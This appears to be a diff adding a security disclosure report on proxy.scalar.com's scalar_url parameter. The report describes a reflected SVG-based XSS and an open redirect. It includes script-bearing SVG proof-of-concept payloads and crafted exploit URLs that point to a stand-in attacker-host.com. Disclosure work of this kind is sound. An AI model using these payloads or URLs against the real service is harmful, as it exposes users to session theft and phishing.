@@ -1,0 +1,65 @@
+1. Vulnerability: Reflected Cross-Site Scripting (XSS) via SVG
+
+● Endpoint: https://proxy.scalar.com/
+● Parameter: scalar_url
+● Severity: High
+
+Description: The endpoint is vulnerable to XSS because it improperly validates SVG files
+loaded via the scalar_url parameter. By hosting a malicious SVG file containing a &lt;script&gt; tag,
+an attacker can execute arbitrary JavaScript in the context of your domain.
+
+Steps to Reproduce:
+● Create an SVG file (poc-xss.svg) with the following content. This payload will simply
+trigger an alert box as a harmless proof of concept.
+
+Payload:- 
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <script type="text/javascript">
+    alert('XSS-Test-PoC');
+  </script>
+</svg>
+
+
+● Host this file on any server (e.g., https://attacker-host.com/poc-xss.svg).
+● Craft a URL targeting your endpoint:
+https://proxy.scalar.com/?&amp;scalar_url=https://attacker-host.com/poc-xss.svg
+● When a user visits this URL, the script from the SVG file executes, and an alert box with
+the text &quot;XSS-Test-PoC&quot; appears.
+
+Impact: An attacker could use this to steal a user&#39;s session cookies (document.cookie), capture
+login credentials, perform actions on their behalf, or redirect them to a phishing site.
+
+2. Vulnerability: Open Redirection via SVG\
+
+
+● Endpoint: https://proxy.scalar.com/
+● Parameter: scalar_url
+● Severity: Medium
+Description: Similar to the XSS vulnerability, the endpoint can be tricked into redirecting users
+to an arbitrary external website using a different SVG payload.
+
+Steps to Reproduce:
+● Create an SVG file (poc-redirect.svg) with the following content:
+
+Payload:- 
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <script>
+    window.location.replace("https://example.com"); 
+  </script>
+</svg>
+
+(Note: example.com is used as a harmless placeholder for a malicious site).
+● Host this file (e.g., https://attacker-host.com/poc-redirect.svg).
+● Craft the target URL: https://proxy.scalar.com/?&amp;scalar_url=https://attacker-
+host.com/poc-redirect.svg
+
+● When a user visits this URL, they are immediately redirected to https://example.com.
+Impact: This vulnerability is often used in phishing campaigns. An attacker can send a link that
+appears to be from your trusted domain (scalar.com), but it will automatically redirect the victim
+to a malicious site designed to steal credentials or deliver malware.
